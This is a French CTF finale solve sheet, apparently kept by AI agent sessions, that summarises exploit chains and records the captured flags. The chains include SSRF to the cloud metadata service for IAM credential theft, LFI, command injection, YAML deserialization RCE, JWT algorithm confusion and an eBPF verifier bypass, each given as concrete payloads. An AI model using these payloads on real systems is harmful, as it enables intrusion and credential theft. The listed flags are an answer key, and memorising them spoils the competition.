# NCTF26 Finale — Fiche des processus (flags obtenus)

> But : maîtriser la méthode de chaque flag avant soumission. Détail complet par challenge
> dans les fichiers `writeups/<nom>.md`. Flags **rotatés** en finale → méthode = constante,
> valeur = re-dérivée sur l'instance live.

## Mes solves (session principale)

### Cloud `*-prefix` ×9 (registry, queue, artifacts, backup, billing, cdn, gateway, identity, metrics)
Object-store type S3, ACL par préfixe. Chaîne (voir `solve_prefix.py`) :
1. `GET /list?prefix=public/` → liste `public/*` (403 sur tout autre préfixe).
2. `GET /get?key=public/backup-notes.txt` → fuit `deploy_secret=AKIA…`.
3. `GET /assume?secret=AKIA…` → `{"role":"backup-restore","token":"role-…"}`.
4. `GET /get?key=private/flag` + header `X-Role-Token: role-…` → flag.
Piège : `private/flag` non listable (« served by no route ») → deviner la clé. Warmup cold-start.

### klouto (web) — SSRF
`/api/preview?url=` fetch côté serveur, sans filtrage IP privée.
`?url=http://127.0.0.1:5100/internal/flag` → flag (port interne 5100, route `/internal/flag`).

### ghostflag (web) — content discovery + leurres
robots.txt + commentaires HTML pointent un dossier. Vrai flag :
`/secret_files/fnd_password/flag.json`. Leurres : faux flag `/api/agent/check`, `flag.txt`=index.

### sokode-crypto (500) — DFA AES-128 (Piret–Quisquater)
`oracle.py` = AES-128 manuel ; mode « dégradé » injecte 1 faute avant MixColumns R9.
16 télégrammes (PT, CT, CT_fauté, colonne). Par colonne fautée → 4 octets de K10 ;
intersection des candidats → K10 complet → inversion du key schedule → clé maître (=flag).
RSA (N divisible par 3 mais N/3 non premier) = leurre. Solveur `solve_sokode.py`.

### ebpf-mirage (300) — bypass vérificateur eBPF (shift mod 32)
Service TLS nc, bytecode eBPF (`[op][dst][src][off][imm32]`). R1 = ptr map (size 0x40).
`LDXB` exige `reg[off].umax < map_size`. Bug : handler `RSH` du vérif pose umax=0 si shift≥32,
mais `shr` x86 masque le shift à 5 bits (shift 32 = 0 = inchangé). Exploit :
`MOV R2,idx ; MOV R3,32 ; RSH R2,R3 ; LDXB R0,[R1+R2] ; EXIT` → OOB → flag à l'offset 64.
Client `ebpf_client.py`.

## Web série boazak (résolus par la session voisine, en pur Bash)

| # | Faille | Clé du processus |
|---|---|---|
| agoe | BOLA/IDOR batch | `GET /api/users?ids=[2,1]` — autz ne check que le 1er id |
| tsevie | LFI | `GET /api/note?file=/proc/self/environ` → `FLAG=` dans l'env |
| akodessewa | Mass assignment | `POST /api/register` + champ admin → session admin → `/admin` |
| kande | Config merge | `POST /api/config {"admin":true}` → `/admin` |
| be | .git exposé | dump historique → `backup.zip` ZipCrypto → rockyou `chloedev` |
| vogan | YAML deser (RCE) | `POST /apply` `yaml.load`; oracle d'erreur `!!python/object/apply:...os.getenv["FLAG"]` |
| atakpame | Command injection | `/api/process?name=` `shell=True` → `name=\`cat /flags/flag.txt >&2\`` |
| togbi | JWT RS256→HS256 | récup pub via sign2n/gcd de 3 sigs, forge HS256 (PEM SPKI comme secret HMAC), `role=SUPER_A_DMIN` |
| mono | SSRF proxy | `GET /admin-flag` (backend joignable). ⚠️ possible leurre/instance mal routée |

## Murs anti-IA (non faisables sans humain)
- Série **isid0r3** (bibliotech/carnet/curfew/…) : CAPTCHA login+register vérifié serveur,
  SECRET_KEY Flask fort (rockyou épuisé), meta noai. Vuln réelle = JWT/JWKS forge, mais
  bloquée derrière le captcha → **nécessite un humain** (résoudre captcha + passer le cookie).
- Règle : on ne contourne jamais un captcha (anti-bot).

## Bloqué par l'infra
- **atakpame-pipeline (boot2root 500)** : VPN WireGuard OK, source CI clonée (registre
  « atakpame-registry », git dumb-HTTP read-only, hooks `/opt/runner/`, upload token-gated),
  mais l'instance web ne sert pas (Werkzeug mono-thread qui plante + latence VPN) → à retenter.

---

# Session ctf-finale-2ece (2026-11-19) — 10 flags

> Méthode à maîtriser avant/pour défendre la soumission. Détail complet dans `writeups/<nom>.md`.

## ⚡ FIRST BLOOD — cdn-imds (cloud 500, 0 solve) + série *-imds
**Même service sur 3 déco** : `artifacts-imds` (449), `billing-imds` (500), `cdn-imds` (500, **first blood**).
Chaîne **SSRF → IMDS → assume-role → objet privé**. Script unique : `solve_imds.py <url>`.

Processus pas-à-pas (reproductible à la main, à montrer au jury) :
1. `GET /` → le service expose `/fetch?url=...` (lit des « manifestes de backup ») et
   `/objects/<key>` (privé si `X-Role-Token`). Host interne annoncé : `backups.nctf.internal`.
2. **SSRF** : `/fetch` fait un GET **côté serveur** sans filtrer les IP internes. On le pointe sur le
   **metadata service** (169.254.169.254, façon AWS) :
   `GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   → rôle **`backup-role`**.
3. **Vol du credential** :
   `GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/backup-role`
   → `{"AccessKeyId":"ASIA…","Token":"FwoG…"}`.
4. **Assume-role / lecture privée** : rejouer le token sur l'object store :
   `GET /objects/flag` avec header **`X-Role-Token: <Token>`** → flag.
- **Pourquoi c'est la bonne faille** (phrase jury) : « Un endpoint censé ne lire que des backups
  *publics* atteint en réalité le réseau interne et le service de métadonnées cloud ; on y vole le
  credential du rôle IAM de la machine, puis on s'en sert pour lire l'objet protégé. C'est
  l'escalade SSRF→IMDS classique (ex. Capital One 2019). »
- Piège : « flag served by no route / on the filesystem » → ne pas chercher une route directe ; la
  clé est `flag` via `/objects/` **avec** le token du rôle.
- Flags : artifacts=`NCTF{8780ec8e1de2dbc00e5dec33}`, billing=`NCTF{6160286625f026849a85dc5e}`,
  **cdn=`NCTF{d7265367bf2f3a4cd1c7d318}`**.

## spiffe-mtls-ghost (cloud 187)
SVID forgé (seed HMAC leaké dans `bundle_config.json` → `key=SHA256(seed)`). **Confused deputy** :
l'ingress vérifie `uris[0]` (doit être `…/ns/sandbox/…`), la vault gate vérifie `uris[-1]` (doit être
`…/sa/vault-controller`) → SVID **multi-URI** passe les deux. `Authorization: Bearer <b64url(json)>.<hmac>`
→ `{"status":"authorized","vault_secret": FLAG}`. Éviter CN=`admin.internal` (leurre honeypot).
Flag=`NCTF{984c1274da61f760a5b29dea}`. Exploit `challenges/spiffe-ghost/exploit.py`.

## Crypto (offline, fichiers fournis)
- **fast-enough** (50) : filter-LFSR 80b. F a immunité algébrique 2 → annihilateur deg2
  (`F=1⇒x4(x1⊕x3)=0`) → linéarisation monômes quadratiques → noyau GF(2) dim1 → état → prédire 64 bits.
  25 rounds/32s. `NCTF{aa2eba38db8805c1ba58305c}`.
- **yeye** (50) : length-extension `SHA256(secret‖msg)`. PIÈGE : `/pay?msg=` veut l'**hex** des octets
  (le glue padding a des octets non-UTF-8). +`&user=admin`, brute len secret (28). `NCTF{ae0f02cfa7e7024142f1f257}`.
- **commit-bias** (50) : « provably fair » truqué. Draws `Y_r∈F_p` liées par récurrence linéaire
  **ordre 7** → Berlekamp-Massey sur F_p prédit `Y_vault` (jamais ouvert) → commit match → key=SHA256(Y) →
  XOR CT. `NCTF{c0mmit_r3v34l_but_th3_dr4ws_w3re_l1n34rly_l1nk3d}`.
- **twister-tell** (50) : MT19937. 624 sorties → untemper (inverses par point fixe) → `setstate` index 624
  → keystream mots 32-bit **big-endian** → XOR flag.enc. `NCTF{mt19937_untempered_then_the_future_is_yours}`.

## Reverse (offline, analyse statique, zéro exécution)
- **crc-forge** (50) : ELF strippé. Flag 28 car. CRC32 **par octet** (poly 0xEDB88320, **init=~index**,
  xorout=0xFFFFFFFF), 28 cibles à `.rodata:0x2060`. Bijection par octet → brute 28×256. `NCTF{crc32_le4ks_ev3ry_byt3}`.
- **pyc-ghost** (50) : `vault.pyc` (py3.11, désassemblé via `xdis` sous py3.12). `DATA[i]=flag[i]^LCG`,
  LCG `(x>>16)&255` (SEED=4919, MUL=1103515245, ADD=12345, MASK=0x7fffffff). `NCTF{marsh4l_unp1ckl3d_th3_c0de}`.

## OSINT — alerte-uvci (154) — flag PROPOSÉ (2 champs à confirmer)
Chaîne clearnet : article cyberc4st → post LinkedIn d'Adama Assiongbon → **screenshot du post forum**
(ouvert en pleine résolution via l'URL media.licdn directe). Profil acteur lu : username **Sensitive2025**
(recoupé VECERT/Brinztech), badge **MVP**, Posts **92**, Threads **86**, Réputation **149**, contact **Telegram**.
Forum = **DarkForums** (déduit, non visible dans le crop → à confirmer). Flag proposé :
`NCTF{Sensitive2025_MVP_92_86_149_Telegram_DarkForums}` — vérifier Q1 (handle Telegram) et Q7 (forum) avant soumission.

## En attente
- **atike** (crypto 50) : padding oracle Vaudenay OK → `permission:admin@corp.io`, mais `/check` veut un
  plaintext précis inconnu → besoin du **hint 40 pts** (WAF à froid). `solve_atike.py` + `solve_atike_forge.py`.
